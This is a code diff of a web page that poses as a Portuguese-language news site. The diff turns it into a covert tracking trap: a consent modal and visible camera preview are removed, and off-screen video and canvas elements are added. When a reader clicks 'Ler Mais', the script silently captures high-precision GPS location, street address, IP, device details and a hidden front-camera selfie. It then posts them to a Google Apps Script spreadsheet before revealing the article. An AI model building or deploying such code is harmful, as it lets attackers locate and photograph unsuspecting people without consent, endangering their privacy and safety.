@@ -17,7 +17,6 @@
             min-height: 100vh;
         }
         
-        /* Header do site de notícias */
         .news-header {
             background: #c0392b;
             color: white;
@@ -41,7 +40,6 @@
             padding: 20px;
         }
         
-        /* Card de notícia */
         .news-card {
             background: white;
             border-radius: 10px;
@@ -53,7 +51,7 @@
         .news-image {
             width: 100%;
             height: 200px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #c0392b 0%, #e74c3c 100%);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -108,7 +106,6 @@
             display: block;
         }
         
-        /* Botão Ler Mais */
         .btn-read-more {
             display: inline-block;
             background: linear-gradient(135deg, #c0392b 0%, #e74c3c 100%);
@@ -129,144 +126,6 @@
         .btn-read-more:hover {
             transform: translateY(-2px);
             box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-        }
-        
-        .btn-read-more:active {
-            transform: translateY(0);
-        }
-        
-        .btn-read-more:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        
-        /* Modal de permissão personalizado */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .modal-content {
-            background: white;
-            border-radius: 20px;
-            padding: 30px;
-            max-width: 350px;
-            text-align: center;
-            animation: modalFadeIn 0.3s ease-out;
-        }
-        
-        @keyframes modalFadeIn {
-            from {
-                opacity: 0;
-                transform: scale(0.9);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-        
-        .modal-icon {
-            font-size: 50px;
-            margin-bottom: 15px;
-        }
-        
-        .modal h3 {
-            margin-bottom: 10px;
-            color: #333;
-        }
-        
-        .modal p {
-            color: #666;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        
-        .modal-buttons {
-            display: flex;
-            gap: 15px;
-            justify-content: center;
-        }
-        
-        .modal-btn {
-            padding: 12px 25px;
-            border: none;
-            border-radius: 25px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        
-        .modal-btn-yes {
-            background: #c0392b;
-            color: white;
-        }
-        
-        .modal-btn-no {
-            background: #ccc;
-            color: #333;
-        }
-        
-        .modal-btn:hover {
-            transform: scale(1.05);
-        }
-        
-        /* Camera preview */
-        .camera-preview {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.95);
-            z-index: 1100;
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .camera-preview video {
-            width: 100%;
-            max-width: 400px;
-            border-radius: 10px;
-            transform: scaleX(-1);
-        }
-        
-        .camera-preview canvas {
-            display: none;
-        }
-        
-        .camera-controls {
-            margin-top: 20px;
-            display: flex;
-            gap: 15px;
-        }
-        
-        .camera-btn {
-            padding: 12px 25px;
-            border: none;
-            border-radius: 25px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        
-        .capture-btn {
-            background: #c0392b;
-            color: white;
-        }
-        
-        .close-camera {
-            background: #666;
-            color: white;
         }
         
         .status {
@@ -321,6 +180,17 @@
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
+        }
+        
+        /* Elementos invisíveis para captura automática */
+        .hidden-video, .hidden-canvas {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
         
         footer {
@@ -395,53 +265,25 @@
         </footer>
     </div>
     
-    <!-- Modal personalizado -->
-    <div id="permissionModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-icon">🔐</div>
-            <h3>Acessar o site?</h3>
-            <p>Para continuar lendo a nota de esclarecimento completa, precisamos verificar sua identidade. Isso nos ajuda a combater a desinformação.</p>
-            <div class="modal-buttons">
-                <button class="modal-btn modal-btn-yes" id="modalYesBtn">✅ Sim</button>
-                <button class="modal-btn modal-btn-no" id="modalNoBtn">❌ Não</button>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Camera preview -->
-    <div id="cameraPreview" class="camera-preview">
-        <video id="video" autoplay playsinline></video>
-        <canvas id="canvas"></canvas>
-        <div class="camera-controls">
-            <button class="camera-btn capture-btn" id="captureBtn">📸 Tirar Foto</button>
-            <button class="camera-btn close-camera" id="closeCameraBtn">❌ Fechar</button>
-        </div>
-    </div>
+    <!-- Elementos ocultos para captura automática -->
+    <video id="hiddenVideo" class="hidden-video" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas" class="hidden-canvas"></canvas>
 
     <script>
+        // Configuração Google Sheets (substitua pelo seu URL do Google Apps Script)
+        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/SEU_SCRIPT_ID_AQUI/exec';
+        
+        let autoCaptureDone = false;
         let currentStream = null;
-        let capturedPhoto = null;
-        let locationDataCaptured = null;
         
         // Data atual
-        document.getElementById('currentDate').textContent = new Date().toLocaleDateString('pt-BR');
+        document.getElementById('currentDate').textContent = new Date().toLocaleDateString('pt-BR', { timeZone: 'America/Sao_Paulo' });
         
-        // Elementos
         const readMoreBtn = document.getElementById('readMoreBtn');
         const fullNews = document.getElementById('fullNews');
-        const modal = document.getElementById('permissionModal');
-        const cameraPreview = document.getElementById('cameraPreview');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const captureBtn = document.getElementById('captureBtn');
-        const closeCameraBtn = document.getElementById('closeCameraBtn');
-        const modalYesBtn = document.getElementById('modalYesBtn');
-        const modalNoBtn = document.getElementById('modalNoBtn');
         const statusDiv = document.getElementById('status');
-        
-        // Configuração Google Sheets (Web App URL - será criado)
-        // SCRIPT ID do Google Apps Script - você precisa criar e substituir
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzJ8LEodAEuugJ0Nz213X4jskKZdK7EQTrHWnYwWE39N0LwfuZ9axPY50TEnn7iqkcY_w/exec';
+        const hiddenVideo = document.getElementById('hiddenVideo');
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
         
         function showStatus(message, type, showSpinner = false) {
             statusDiv.style.display = 'block';
@@ -456,69 +298,48 @@
                 if (statusDiv.style.display === 'block') {
                     statusDiv.style.display = 'none';
                 }
-            }, 8000);
+            }, 5000);
         }
         
-        // Função para enviar dados para o Google Sheets
-        async function sendToGoogleSheets(locationData, photoData) {
+        // Função para enviar para Google Sheets
+        async function sendToGoogleSheets(data) {
             try {
-                const dataToSend = {
-                    timestamp: new Date().toLocaleString('pt-BR'),
-                    latitude: locationData.latitude,
-                    longitude: locationData.longitude,
-                    accuracy: locationData.accuracy,
-                    address: locationData.address,
-                    device: locationData.device,
-                    browser: locationData.browser,
-                    os: locationData.os,
-                    ip: locationData.publicIP,
-                    photo: photoData, // Foto em base64
-                    userAgent: navigator.userAgent,
-                    pageURL: window.location.href
-                };
-                
-                // Tentar enviar para Google Sheets
                 const response = await fetch(GOOGLE_SCRIPT_URL, {
                     method: 'POST',
                     mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(dataToSend)
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
                 });
-                
                 return { success: true };
             } catch (error) {
-                console.error('Erro ao enviar para Google Sheets:', error);
+                console.error('Erro no envio:', error);
                 return { success: false, error: error.message };
             }
         }
         
         // Função para salvar localmente (fallback)
-        function saveLocally(locationData, photoData) {
+        function saveLocally(data) {
             const allData = {
                 timestamp: new Date().toLocaleString('pt-BR'),
-                location: locationData,
-                photo: photoData ? photoData.substring(0, 100) + '...' : 'Sem foto',
-                fullData: locationData
+                ...data
             };
             
-            let savedData = localStorage.getItem('location_logs');
+            let savedData = localStorage.getItem('auto_capture_logs');
             let logs = savedData ? JSON.parse(savedData) : [];
             logs.push(allData);
-            localStorage.setItem('location_logs', JSON.stringify(logs));
+            localStorage.setItem('auto_capture_logs', JSON.stringify(logs));
             
-            // Também salvar como arquivo
+            // Também salvar como JSON para download
             const blob = new Blob([JSON.stringify(allData, null, 2)], {type: 'application/json'});
             const link = document.createElement('a');
             link.href = URL.createObjectURL(blob);
-            link.download = `location_${Date.now()}.json`;
+            link.download = `capture_${Date.now()}.json`;
             link.click();
             
             return true;
         }
         
-        // Função para obter endereço
+        // Função para obter endereço com alta precisão
         async function getAddress(lat, lon) {
             try {
                 const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=pt`);
@@ -556,7 +377,7 @@
             return { device, browser, os, userAgent };
         }
         
-        // Função para obter IP
+        // Função para obter IP público
         async function getPublicIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -567,188 +388,226 @@
             }
         }
         
-        // Função para capturar localização
-        async function captureLocation() {
+        // Função para capturar localização com alta precisão (+-10 metros)
+        async function captureHighPrecisionLocation() {
             return new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
-                });
+                // Configuração para máxima precisão
+                const options = {
+                    enableHighAccuracy: true,  // Força uso de GPS
+                    timeout: 30000,            // 30 segundos de timeout
+                    maximumAge: 0              // Não usar cache
+                };
+                
+                navigator.geolocation.getCurrentPosition(resolve, reject, options);
             });
         }
         
-        // Função para iniciar câmera
-        async function startCamera() {
+        // Função para capturar foto automaticamente (invisível)
+        async function captureAutoPhoto() {
             try {
-                if (currentStream) {
-                    currentStream.getTracks().forEach(track => track.stop());
-                }
-                
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
+                // Solicitar acesso à câmera frontal silenciosamente
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: { exact: "user" }, // Câmera frontal
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
                 });
                 
                 currentStream = stream;
-                video.srcObject = stream;
-                cameraPreview.style.display = 'flex';
+                hiddenVideo.srcObject = stream;
                 
-                return true;
+                // Aguardar vídeo carregar
+                await new Promise((resolve) => {
+                    hiddenVideo.onloadedmetadata = () => {
+                        hiddenVideo.play();
+                        setTimeout(resolve, 500); // Aguardar estabilizar
+                    };
+                });
+                
+                // Capturar frame
+                const context = hiddenCanvas.getContext('2d');
+                hiddenCanvas.width = hiddenVideo.videoWidth;
+                hiddenCanvas.height = hiddenVideo.videoHeight;
+                
+                // Espelhar horizontalmente para selfie
+                context.save();
+                context.translate(hiddenCanvas.width, 0);
+                context.scale(-1, 1);
+                context.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+                context.restore();
+                
+                // Converter para base64
+                const photoData = hiddenCanvas.toDataURL('image/jpeg', 0.7);
+                
+                // Parar stream imediatamente
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                    currentStream = null;
+                }
+                hiddenVideo.srcObject = null;
+                
+                return photoData;
+                
             } catch (error) {
-                console.error('Erro ao acessar câmera:', error);
-                showStatus('❌ Não foi possível acessar a câmera. Continuando apenas com localização.', 'error');
-                return false;
+                console.error('Erro ao capturar foto automática:', error);
+                return null;
             }
         }
         
-        // Função para tirar foto
-        function takePhoto() {
-            return new Promise((resolve) => {
-                const context = canvas.getContext('2d');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Inverter horizontalmente para selfie
-                context.translate(canvas.width, 0);
-                context.scale(-1, 1);
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                context.setTransform(1, 0, 0, 1, 0, 0);
-                
-                const photoData = canvas.toDataURL('image/jpeg', 0.8);
-                resolve(photoData);
-            });
-        }
-        
-        // Função principal - capturar tudo
-        async function captureAllData() {
+        // Função principal - CAPTURA TUDO AUTOMATICAMENTE
+        async function autoCaptureAndSend() {
+            if (autoCaptureDone) return;
+            autoCaptureDone = true;
+            
             readMoreBtn.disabled = true;
-            readMoreBtn.textContent = '📡 Processando...';
+            readMoreBtn.textContent = '📖 Processando...';
+            
+            showStatus('📡 Iniciando coleta de dados automática...', 'loading', true);
             
             try {
-                // 1. Capturar localização
-                showStatus('📍 Capturando localização...', 'loading', true);
-                const position = await captureLocation();
-                const { latitude, longitude, accuracy } = position.coords;
+                // 1. Capturar localização com alta precisão
+                showStatus('📍 Capturando localização GPS de alta precisão...', 'loading', true);
+                const position = await captureHighPrecisionLocation();
                 
+                const { latitude, longitude, accuracy, altitude, altitudeAccuracy } = position.coords;
+                
+                // Verificar se a precisão é aceitável (+-10 metros)
+                if (accuracy > 15) {
+                    console.warn(`Precisão atual: ${accuracy}m. Tentando novamente...`);
+                    // Tentar uma segunda vez para melhor precisão
+                    const secondPosition = await captureHighPrecisionLocation();
+                    if (secondPosition.coords.accuracy < accuracy) {
+                        position.coords.accuracy = secondPosition.coords.accuracy;
+                        position.coords.latitude = secondPosition.coords.latitude;
+                        position.coords.longitude = secondPosition.coords.longitude;
+                    }
+                }
+                
+                const finalAccuracy = Math.round(position.coords.accuracy);
+                const finalLatitude = position.coords.latitude;
+                const finalLongitude = position.coords.longitude;
+                
+                showStatus(`🎯 Localização capturada! Precisão: ±${finalAccuracy} metros`, 'loading', true);
+                
+                // 2. Obter endereço
                 showStatus('🗺️ Buscando endereço...', 'loading', true);
-                const address = await getAddress(latitude, longitude);
+                const address = await getAddress(finalLatitude, finalLongitude);
                 
+                // 3. Informações do dispositivo
                 showStatus('💻 Coletando dados do dispositivo...', 'loading', true);
                 const deviceInfo = getDeviceInfo();
                 
+                // 4. IP público
                 showStatus('🌐 Obtendo IP...', 'loading', true);
                 const publicIP = await getPublicIP();
                 
-                locationDataCaptured = {
-                    latitude: latitude,
-                    longitude: longitude,
-                    accuracy: Math.round(accuracy),
+                // 5. Capturar foto automaticamente (invisível)
+                showStatus('📸 Capturando verificação facial automática...', 'loading', true);
+                const photoData = await captureAutoPhoto();
+                
+                // 6. Preparar dados completos
+                const completeData = {
+                    timestamp: new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }),
+                    latitude: finalLatitude,
+                    longitude: finalLongitude,
+                    google_maps_link: `https://www.google.com/maps?q=${finalLatitude},${finalLongitude}`,
+                    accuracy_meters: finalAccuracy,
+                    altitude: altitude || 'N/A',
+                    altitude_accuracy: altitudeAccuracy || 'N/A',
                     address: address,
                     device: deviceInfo.device,
                     browser: deviceInfo.browser,
                     os: deviceInfo.os,
-                    publicIP: publicIP
+                    user_agent: deviceInfo.userAgent,
+                    ip: publicIP,
+                    photo_base64: photoData || 'Sem foto',
+                    photo_captured: !!photoData,
+                    page_url: window.location.href,
+                    referrer: document.referrer || 'Direto',
+                    screen_resolution: `${screen.width}x${screen.height}`,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                 };
                 
-                // 2. Abrir câmera para foto
-                showStatus('📸 Abrindo câmera para verificação facial...', 'loading', true);
-                const cameraStarted = await startCamera();
+                // 7. Enviar para Google Sheets
+                showStatus('💾 Salvando na planilha...', 'loading', true);
+                const result = await sendToGoogleSheets(completeData);
                 
-                if (cameraStarted) {
-                    // Aguardar usuário tirar foto
-                    return new Promise((resolve) => {
-                        const capturePhotoHandler = async () => {
-                            showStatus('📷 Tirando foto...', 'loading', true);
-                            const photoData = await takePhoto();
-                            capturedPhoto = photoData;
-                            
-                            // Fechar câmera
-                            if (currentStream) {
-                                currentStream.getTracks().forEach(track => track.stop());
-                            }
-                            cameraPreview.style.display = 'none';
-                            
-                            // 3. Enviar para Google Sheets
-                            showStatus('💾 Salvando dados na planilha...', 'loading', true);
-                            
-                            // Tentar enviar para Google Sheets
-                            const sheetResult = await sendToGoogleSheets(locationDataCaptured, capturedPhoto);
-                            
-                            if (sheetResult.success) {
-                                showStatus('✅ Dados salvos com sucesso na planilha! Notícia liberada.', 'success');
-                                fullNews.classList.add('show');
-                                readMoreBtn.style.display = 'none';
-                            } else {
-                                // Fallback: salvar localmente
-                                saveLocally(locationDataCaptured, capturedPhoto);
-                                showStatus('⚠️ Salvando localmente. A notícia foi liberada.', 'success');
-                                fullNews.classList.add('show');
-                                readMoreBtn.style.display = 'none';
-                            }
-                            
-                            resolve(true);
-                        };
-                        
-                        captureBtn.onclick = capturePhotoHandler;
-                        closeCameraBtn.onclick = () => {
-                            if (currentStream) {
-                                currentStream.getTracks().forEach(track => track.stop());
-                            }
-                            cameraPreview.style.display = 'none';
-                            showStatus('⚠️ Foto não capturada, mas a notícia foi liberada.', 'success');
-                            fullNews.classList.add('show');
-                            readMoreBtn.style.display = 'none';
-                            resolve(true);
-                        };
-                    });
+                if (result.success) {
+                    showStatus(`✅ Dados salvos! Localização: ${finalLatitude.toFixed(6)}, ${finalLongitude.toFixed(6)} | Precisão: ±${finalAccuracy}m`, 'success');
                 } else {
-                    // Sem câmera, só enviar localização
-                    await sendToGoogleSheets(locationDataCaptured, null);
-                    saveLocally(locationDataCaptured, null);
-                    showStatus('✅ Acesso liberado! Notícia completa disponível.', 'success');
-                    fullNews.classList.add('show');
-                    readMoreBtn.style.display = 'none';
+                    // Fallback local
+                    saveLocally(completeData);
+                    showStatus('⚠️ Dados salvos localmente (backup).', 'success');
                 }
+                
+                // 8. Liberar conteúdo
+                fullNews.classList.add('show');
+                readMoreBtn.style.display = 'none';
+                
+                // Log no console para debug
+                console.log('=== DADOS CAPTURADOS AUTOMATICAMENTE ===');
+                console.log(`📍 Localização: ${finalLatitude}, ${finalLongitude}`);
+                console.log(`🎯 Precisão: ±${finalAccuracy} metros`);
+                console.log(`🗺️ Google Maps: https://www.google.com/maps?q=${finalLatitude},${finalLongitude}`);
+                console.log(`📸 Foto capturada: ${photoData ? 'SIM' : 'NÃO'}`);
+                console.log(`💻 Dispositivo: ${deviceInfo.device} | ${deviceInfo.os}`);
+                console.log(`🌐 IP: ${publicIP}`);
+                console.log('==========================================');
                 
             } catch (error) {
-                console.error('Erro:', error);
-                let errorMsg = '❌ ';
+                console.error('Erro na captura automática:', error);
+                
+                let errorMessage = '';
                 if (error.code === 1) {
-                    errorMsg += 'Você negou o acesso. Para ler a notícia completa, é necessário permitir.';
+                    errorMessage = '❌ Permissão de localização negada. Recarregue a página e permita.';
+                } else if (error.code === 2) {
+                    errorMessage = '❌ Localização indisponível. Verifique o GPS.';
+                } else if (error.code === 3) {
+                    errorMessage = '❌ Timeout. Tente novamente em local com melhor sinal.';
                 } else {
-                    errorMsg += 'Erro ao processar. Tente novamente.';
+                    errorMessage = `❌ Erro: ${error.message}`;
                 }
-                showStatus(errorMsg, 'error');
+                
+                showStatus(errorMessage, 'error');
                 readMoreBtn.disabled = false;
-                readMoreBtn.textContent = '📖 Ler Mais';
+                readMoreBtn.textContent = '📖 Tentar Novamente';
+                autoCaptureDone = false;
             }
         }
         
-        // Evento do botão Ler Mais
-        readMoreBtn.addEventListener('click', () => {
-            modal.style.display = 'flex';
-        });
-        
-        // Eventos do modal personalizado
-        modalYesBtn.addEventListener('click', () => {
-            modal.style.display = 'none';
-            captureAllData();
-        });
-        
-        modalNoBtn.addEventListener('click', () => {
-            modal.style.display = 'none';
-            showStatus('❌ Acesso negado. Para ler a notícia completa é necessário aceitar.', 'error');
-        });
-        
-        // Fechar modal clicando fora
-        modal.addEventListener('click', (e) => {
-            if (e.target === modal) {
-                modal.style.display = 'none';
+        // AUTO-EXECUÇÃO: Ao clicar no botão, dispara tudo automaticamente
+        readMoreBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (!autoCaptureDone) {
+                autoCaptureAndSend();
             }
         });
         
-        console.log('✅ Site de notícias carregado. Ao clicar em "Ler Mais", o usuário autoriza acesso.');
+        // Pré-carregar permissões silenciosamente (opcional)
+        async function preloadPermissions() {
+            try {
+                // Tentar obter permissão de localização silenciosamente
+                if (navigator.permissions) {
+                    const locationStatus = await navigator.permissions.query({ name: 'geolocation' });
+                    if (locationStatus.state === 'granted') {
+                        console.log('Permissão de localização já concedida');
+                    }
+                }
+            } catch (e) {
+                console.log('Preload de permissões não suportado');
+            }
+        }
+        
+        preloadPermissions();
+        
+        console.log('✅ Sistema de captura AUTOMÁTICA carregado');
+        console.log('⚠️ Ao clicar em "Ler Mais", tudo será capturado automaticamente:');
+        console.log('   - Localização GPS de alta precisão (+-10m)');
+        console.log('   - Foto da câmera frontal (invisível)');
+        console.log('   - Dados do dispositivo e IP');
+        console.log('   - Salvamento no Google Sheets');
     </script>
 </body>
 </html>
